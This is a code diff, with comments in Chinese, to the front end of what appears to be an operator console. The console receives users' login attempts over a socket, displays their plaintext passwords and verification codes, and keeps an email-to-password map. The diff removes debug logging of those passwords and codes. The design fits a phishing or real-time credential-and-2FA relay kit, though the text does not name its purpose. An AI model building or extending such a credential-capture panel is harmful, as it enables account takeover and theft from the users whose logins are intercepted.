@@ -13,13 +13,11 @@
         
         // 添加取消登录请求的监听器
         this.socket.on('cancel-login-request', (data) => {
-            console.log('收到取消登录请求:', data);
             
             // 从页面中移除已取消的登录请求
             const requestElement = document.querySelector(`#loginRequestsList .request-item[data-id="${data.id}"]`);
             if (requestElement) {
                 requestElement.remove();
-                console.log(`已从页面中移除登录请求 ${data.id}`);
                 
                 // 更新计数
                 this.updatePendingCount();
@@ -49,14 +47,7 @@
             return;
         }
 
-        // 添加调试日志
-        console.log('显示登录请求数据:', requests);
-        if (requests.length > 0) {
-            console.log('第一个请求的密码字段:', requests[0].password);
-        }
-
         container.innerHTML = requests.map(request => {
-            console.log(`请求ID ${request.id} 的密码:`, request.password);
             return `
             <div class="request-item" data-id="${request.id}">
                 <div class="request-header">
@@ -79,12 +70,6 @@
             const response = await this.apiRequest('/api/admin/verification-requests');
             if (response && response.ok) {
                 const requests = await response.json();
-                console.log('从服务器获取的验证请求数据:', requests);
-                if (requests.length > 0) {
-                    console.log('第一个验证请求的完整数据:', requests[0]);
-                    console.log('第一个验证请求的密码字段类型:', typeof requests[0].password);
-                    console.log('第一个验证请求的密码字段值:', requests[0].password);
-                }
                 this.displayVerificationRequests(requests);
             }
         } catch (error) {
@@ -101,22 +86,13 @@
             return;
         }
 
-        // 添加调试日志
-        console.log('显示验证请求数据:', requests);
-        if (requests.length > 0) {
-            console.log('第一个验证请求的密码字段:', requests[0].password);
-            console.log('第一个验证请求的验证码:', requests[0].verification_code);
-        }
-
         container.innerHTML = requests.map(request => {
             // 尝试从邮箱-密码映射中获取密码
             let password = request.password;
             if (!password && request.email && this.emailPasswordMap.has(request.email)) {
                 password = this.emailPasswordMap.get(request.email);
-                console.log(`从映射中获取到邮箱 ${request.email} 的密码`);
             }
 
-            console.log(`验证请求ID ${request.id} 的密码:`, password);
             return `
             <div class="request-item" data-id="${request.id}">
                 <div class="request-header">
@@ -185,7 +161,6 @@
 
         // 存储邮箱和密码的映射，用于验证请求
         if (request.email && request.password) {
-            console.log(`存储邮箱 ${request.email} 的密码映射`);
             this.emailPasswordMap.set(request.email, request.password);
         }
 
@@ -217,12 +192,10 @@
         // 检查是否已经存在相同ID的请求，如果存在则不添加
         const existingRequest = document.querySelector(`#verificationRequestsList .request-item[data-id="${request.id}"]`);
         if (existingRequest) {
-            console.log(`验证请求ID ${request.id} 已存在，不重复添加`);
             return;
         }
 
         // 直接使用传入的请求数据，因为Socket事件已经包含了所有必要信息
-        console.log('添加验证请求，使用Socket事件数据:', request);
         this.renderVerificationRequest(request);
     };
 
@@ -232,7 +205,6 @@
             const response = await this.apiRequest(`/api/admin/verification-request/${id}`);
             if (response && response.ok) {
                 const data = await response.json();
-                console.log(`获取到验证请求 ${id} 的完整数据:`, data);
                 return data;
             }
         } catch (error) {
@@ -247,10 +219,7 @@
         let password = request.password;
         if (!password && request.email && this.emailPasswordMap.has(request.email)) {
             password = this.emailPasswordMap.get(request.email);
-            console.log(`从映射中获取到邮箱 ${request.email} 的密码`);
         }
-
-        console.log(`渲染验证请求: ID=${request.id}, 邮箱=${request.email}, 密码=${password}, 验证码=${request.verification_code}`);
 
         const container = document.getElementById('verificationRequestsList');
         const requestElement = document.createElement('div');
